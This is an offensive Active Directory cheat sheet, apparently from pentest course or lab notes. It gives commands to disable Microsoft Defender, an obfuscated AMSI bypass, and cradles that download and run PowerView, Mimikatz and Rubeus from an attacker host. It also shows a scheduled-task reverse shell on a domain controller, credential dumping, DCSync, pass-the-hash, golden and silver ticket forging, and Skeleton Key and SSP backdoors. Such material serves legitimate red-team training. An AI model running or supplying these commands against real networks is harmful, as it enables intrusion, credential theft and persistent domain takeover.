
# AV Evasion

**Disable MS Defender**

- Bypass the execution policy
  ```powershell
  powershell -ep Bypass

- Disable AV using powershell (Requires Local Admin rights)

  ```powershell
  Get-MPPreference
  Set-MPPreference -DisableRealTimeMonitoring $true
  Set-MPPreference -DisableIOAVProtection $true
  Set-MPPreference -DisableIntrusionPreventionSystem $true

- Bypass AMSI Check (If Admin rights are not available)
  ```powershell
  S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )


- Download and execute cradle

  ```powershell
  iex (New-Object Net.WebClient).DownloadString('http://192.168.100.XX/PowerView.ps1')
  iex (New-Object Net.WebClient).DownloadString('http://192.168.100.XX/Invoke-Mimikatz.ps1')
  iex (New-Object Net.WebClient).DownloadString('http://192.168.100.XX/mimilib.dll')
  iex (New-Object Net.WebClient).DownloadString('http://192.168.100.XX/Set-RemotePSRemoting.ps1')
  iex (New-Object Net.WebClient).DownloadString('http://192.168.100.XX/Set-RemoteWMI.ps1')
  iex (New-Object Net.WebClient).DownloadString('http://192.168.100.XX/MS-RPRN.exe')
  iex (New-Object Net.WebClient).DownloadString('http://192.168.100.XX/Rubeus.exe')
  iex (New-Object Net.WebClient).DownloadString('http://192.168.100.XX/Add-RemoteRegBackdoor.ps1')
  iex (New-Object Net.WebClient).DownloadString('http://192.168.100.XX/Find-PSRemotingLocalAdminAccess.ps1')
  iex (New-Object Net.WebClient).DownloadString('http://192.168.100.XX/Find-WMILocalAdminAccess.ps1')

# Enumeration

**Domain Enumeration**

- Get Basic Information about Domain
  ```powershell
  Get-NetDomain

- Find the SID of the current Domain
  ```powershell
  Get-DomainSID

- Find the policy applicable to current domain
  ```powershell
  Get-DomainPolicy
  (Get-DomainPolicy)."Kerberos Policy"

- Find the DC Servers in current Domain
  ```powershell
  Get-NetDomainController
  Get-NetDomainController -Forest OrganicSecurity.local

- Enumerate Domain OU
  ```powershell
  Get-NetOU -FullData


**User, Group & Computer Object**

- Enumerate the Information about the Domain Users

  ```powershell
  Get-NetDomainUser

- Search the user attributes for specific terms

  ```powershell
  Find-UserField -SearchField Description -SearchTerm "Password"

- Find all the groups on the Current Domain

  ```powershell
  Get-NetGroup
  Get-NetGroup -Recurse

- Find Group Membership

  ```powershell
  Get-NetGroupMember -GroupName "EnterPrise Admins" -Domain "OrganicSecurity.local"

- Find local group created on the servers (requires admin rights for checking on non-dc machines)

  ```powershell
  Get-NetLocalGroup -Computername <dc>

- Get the list of Computer Objects

  ```powershell
  Get-NetComputer

**Shares & Juicy Files**

- Identify the shares in current domain

  ```powershell
  Invoke-ShareFinder

- Identify juicy files accessible over the shared folder

  ```powershell
  Invoke-FileFinder

- Find File servers in current domain

  ```powershell
  Get-FileNetServer


**User Hunting**

- Find session of logged on users on the server

  ```powershell
  Get-NetLoggedOn <computer-name>
  (Get-NetComputer -FullData).foreach({Get-NetLoggedOn $_.cn})

- Find last logged on user on the remote machine

  ```powershell
  Get-LastLoggedOn -ComputerName <servername>

- Find all the local admin accounts on all the machines (Required Admin rights on non-dc machines)

  ```powershell
  Invoke-EnumerateLocalAdmin | select ComputerName, AccountName, IsDomain, IsAdmin

- Find Local Admin rights for current user

  ```powershell
  Find-LocalAdminAccess
  Invoke-CheckLocalAdminAccess
  Invoke-CheckLocalAdminAccess -ComputerName <server_fqdn>

- Find the computers where Domain Admin or specified User/Group has active session

  ```powershell
  Invoke-UserHunter

- "stealth" option only checks for session on only High Value Servers

  ```powershell
  Invoke-UserHunter -stealth

- Check for Powershell Remoting access for current user

  ```powershell
  Find-PSRemotingLocalAdminAccess -ComputerName <server_fqdn>

- Check for Remote Access via WMI for current user

  ```powershell
  Find-WMILocalAdminAccess -ComputerName <server_fqdn>


**GPO Enumeration**

- Find all the GPO configured in a given domain

  ```powershell
  Get-NetGPO | select displayname
  Get-NetGPO -ComputerName <server_fqdn>

- Find the GPOs applied on a specific OU in the domain

  ```powershell
  Get-NetOU -FullData | select ou,pglink
  Get-NetGPO -GPOName "{GPO_ID}"


- Find If there is GPO configured which is using Restricted Groups via groups.xml to assign local admin membership

  ```powershell
  Get-NetGPOGroup

- Find machines where the given user is member of a specific group

  ```powershell
  Get-GPOLocation -UserName <username> 


**Access Control Model (ACL)**

- Fetch all the ACL associated with a given user account

  ```powershell
  Get-ObjectAcl -SamAccountName <username> | select AccessControlType, IdentityReference, ActiveDirectoryRights

- Fetch all the ACL by ADSPath for any AD Object

  ```powershell
  Get-ObjectAcl -ADSPath "LDAP://CN={73267-86872-368732},CN=Policies,CN=System,DC=organicsecurity,DC=local"

- Fetch all the ACL by ADSPrefix 
  ```powershell
  Get-ObjectAcl -ADSPrefix "CN=Administrator,CN=Users"

- Use below command to find all the interesting ACEs

  ```powershell
  Invoke-ACLScanner | select AccessControlType, IdentityReference, ActiveDirectoryRights, ObjectDN

- Identify the ACL associated with the specified path

  ```powershell
  GetPathAcl -Path "\\dc.organicsecurity.local\sysvol"

**Forest & Domain Trusts**

- Enumerate Trust of current domain

  ```powershell
  Get-NetDomainTrust

- Enumerate Current Forest, and its domain

  ```powershell
  Get-NetForest
  Get-NetForest -Forest organicsecurity.local

- Enumerate all the domains under given forest

  ```powershell
  Get-NetForestDomain

- Find the Global Catalouge for given forest

  ```powershell
  Get-NetForestCatalog

- Find the forest trust

  ```powershell
  Get-NetForestTrust -Forest organicsecurity.local

**BloodHound & SharpHound**

- Install neo4j service
  
    ```powershell
  .\neo4j.bat install-service
  net start neo4j

  . .\Sharhound.ps1
  Invoke-BloodHound -CollectionMethod All


# PrivEsc - Misconfiguration & Feature Abuse

- Escalate privilege on local system to gain Admin rights
	- PowerUp : https github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
	- BeRoot : https:// github.com/AlessandroZ/BeRoot
  - Privesc : https:// github.com/enjoiz/Privesc

- **PowerUp**

  ```powershell
  Get-ServiceUnquoted
  Invoke-AllChecks

  Invoke-ServiceAbuse -Name 'Sevice Name'


- **Jenkins**

  ```powershell
  .\nc64.exe -l -p 443

  schtasks /create /S dc.organicsecurity.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "Job01" /TR "powershell.exe -c 'iex ( iwr http://192.168.100.XX/dakiya.ps1  -UseBasicParsing); Dakiya -Reverse -IPAddress 192.168.100.YY -Port 443'"

  schtasks /Run /S dc.organicsecurity.local /TN "Job01"

  schtasks /Query /S dc.organicsecurity.local 


# Lateral Movement & Persistance

- Execute command using powershell remoting 
  ```powershell
  
  $sess = New-PSSession -ComputerName <computer/list_of_servers>
  Enter-PSSession -$sess

  Enter-PSSession -ComputerName <server_name>

  Invoke-Command -Scriptblock {Get-Process} -ComputerName <computer>
	Invoke-Command -Scriptblock ${function:Get-Process} -ComputerName <computer>
  Invoke-Command -FilePath <script.ps1> -ComputerName <Get-Content computers.txt>

- **Mimikatz Cheatsheet**

  ```powershell
  Invoke-Mimikatz
  Invoke-Mimikatz -DumpCreds
  Invoke-Mimikatz -DumpCreds -ComputerName <comp>

- Use Mimikatz with PowerShell Remoting
  ```powershell
  Invoke-Command -FilePath invoke-mimikatz.ps1 -Session $sess  

- Dump credentials from memory (lsass.exe)
  ```powershell
  Invoke-Mimimatz -Command '"sekurlsa::logonpasswords"'
  Invoke-Mimimatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'

- Dump credentials from local SAM account (Contains DSRM Admin creds) & LSA (conatins details from ntds.dat)
  ```powershell
  Invoke-Mimimatz -Command '"lsadump::sam"'
  Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername dcorp-dc

- Perform DCSync Attacks (Requires DA Rights) [Mention user in domain\user format only ]
  ```powershell
  Invoke-Mimimatz -Command '"lsadump::dcsync /user:domain\krbtgt /domain:domain.local"'

- Perform PassTheHash (PTH) Attacks (Requires Elevated Shell Access; "RunAs Administrator")
  ```powershell
  Invoke-Mimimatz -Command '"sekurlsa::pth /user:Administrator /domain:organicsecurity.local /ntlm:c10c9ac42937a938c0ca8faf0af0af02 /run:powershell.exe"'

- Use the KRBTGT Hash to craft Golden Ticket (TGT)
  ```powershell

  Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:organicsecurity.local /sid:S-1-5-21-181111131-32111163-5111111 /krbtgt:c10c9ac42937a938c0ca8faf0af0af02 id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ticket:golden_tkt.kirbi"'

  Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:organicsecurity.local /sid:S-1-5-21-181111131-32111163-5111111 /krbtgt:c10c9ac42937a938c0ca8faf0af0af02 id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'

- Import the golden ticket into the memory

  ```powershell
  Invoke-Mimikatz -Command '"kerberos::ptt golden_tkt.kirbi"'

- Crafting Silver Ticket (TGS) for CIFS Service (Requires service account creds/ machine account)

  ```powershell
  Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:organicsecurity.local /sid:S-1-5-21-182222111-321222112-53222211 /rc4:ff46a932423423427602342346f35 /target:dc.organicsecurity.local /service:CIFS/dc.organicsecurity.local /ptt"'

  ls \\organicsecurity.local\c$

  Service TGS: HOST - Scheduled Task | HOST + RPCSS - PowerShell remoting & WMI | LDAP - DCSync

  - Perform Skeleton Key based persistance attack (Use Mimikatz as default password for all account)

  ```powershell
  Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dcorp-dc

- Backdoor SSP on DC to log credentials in cleartext in log file (c:\windows\system32\kiwissp.log)

  ```powershell
  $packages = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' | select -ExpandProperty 'Security Packages'

  $packages +="mimilib"
  
  Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' -Value $packages
  Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name 'Security Packages' -Value $packages

    OR

  Invoke-Mimikatz -Command '"misc::memssp"'


  

